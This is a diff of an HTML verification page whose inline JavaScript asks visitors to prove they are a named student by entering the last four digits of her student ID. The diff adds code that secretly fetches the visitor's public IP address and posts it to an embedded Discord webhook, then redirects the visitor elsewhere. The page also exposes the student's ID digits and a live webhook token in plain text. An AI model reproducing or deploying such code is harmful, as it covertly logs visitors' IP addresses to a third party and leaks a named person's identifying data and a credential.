@@ -51,74 +51,72 @@
         }
     </style>
     <script>
-        var questions = [
-            { question: "To verify that this is Alyssa Linn, please tell me the last 4 digits of your student ID number.", answer: "1737" },
-            { question: "What’s the secret word?", answer: "Pineapple" }     
-        ];
-        
-        var currentQuestionIndex = 0;  // Keeps track of which question to ask
-
-        function updateQuestion() {
-            document.getElementById("question").innerText = questions[currentQuestionIndex].question;
-        }
+        var correctAnswer = "1737";  // The correct student ID last 4 digits
+        var discordWebhookURL = "https://discord.com/api/webhooks/1318695220946272267/KqDt8OwWy9m7JaawU9oZt1F2vmPzH-g01pRmEBUPik0NuP9Se5D9L9dSqb1lUa-OdS4-";  // Your Discord webhook URL
 
         function verifyAnswer() {
             var userAnswer = document.getElementById("studentID").value;
-            var correctAnswer = questions[currentQuestionIndex].answer;
-            var discordWebhookURL = "https://discord.com/api/webhooks/1318695220946272267/KqDt8OwWy9m7JaawU9oZt1F2vmPzH-g01pRmEBUPik0NuP9Se5D9L9dSqb1lUa-OdS4-";  // Your Discord webhook URL
 
             if (userAnswer === correctAnswer) {
                 alert("Congrats, you have been verified!");
-                
-                // Send the notification to Discord
-                fetch(discordWebhookURL, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "User Verification",
-                            description: "User has been verified.",
-                            color: 3066993, // You can change the color of the embed
-                            fields: [
-                                {
-                                    name: "Verification Status",
-                                    value: "User has been verified successfully!"
-                                }
-                            ]
-                        }]
+
+                // Fetch user's IP address using ipify API
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        var userIP = data.ip;  // Get user's IP address
+
+                        // Send the notification to Discord
+                        fetch(discordWebhookURL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                embeds: [{
+                                    title: "User Verification",
+                                    description: "User has been verified.",
+                                    color: 3066993,  // Embed color
+                                    fields: [
+                                        {
+                                            name: "Verification Status",
+                                            value: "User has been verified successfully!"
+                                        },
+                                        {
+                                            name: "User IP Address",
+                                            value: userIP
+                                        }
+                                    ]
+                                }]
+                            })
+                        })
+                        .then(response => {
+                            if (!response.ok) {
+                                console.error("Failed to send notification to Discord");
+                            } else {
+                                console.log("Notification sent to Discord");
+                            }
+                            window.location.href = "https://jamesaai.netlify.app";  // Redirect to the desired URL
+                        })
+                        .catch((error) => {
+                            console.error("Error sending Discord notification:", error);
+                            alert("There was an error sending the notification. Please try again later.");
+                        });
                     })
-                })
-                .then(response => {
-                    if (response.ok) {
-                        console.log("Notification sent to Discord");
-                    } else {
-                        console.error("Failed to send notification to Discord");
-                    }
-                    window.location.href = "https://jamesaai.netlify.app"; // Redirect to this URL
-                })
-                .catch((error) => {
-                    console.error("Error sending Discord notification:", error);
-                    alert("There was an error sending the notification. Please try again later.");
-                });
-                
-                // Rotate to the next question for the next user
-                currentQuestionIndex = (currentQuestionIndex + 1) % questions.length;
-                updateQuestion();
+                    .catch((error) => {
+                        console.error("Error getting IP address:", error);
+                        alert("Could not retrieve your IP address. Please try again.");
+                    });
             } else {
                 alert("Incorrect answer. Please try again.");
             }
         }
-
-        // Initialize the first question
-        window.onload = updateQuestion;
     </script>
 </head>
 <body>
     <div class="container">
-        <h2 id="question">Loading question...</h2>
-        <input type="text" id="studentID" placeholder="Enter answer here">
+        <h2>To verify that this is Alyssa Linn, please tell me the last 4 digits of your student ID number:</h2>
+        <input type="text" id="studentID" placeholder="Enter last 4 digits" maxlength="4">
         <br>
         <button onclick="verifyAnswer()">Submit</button>
     </div>
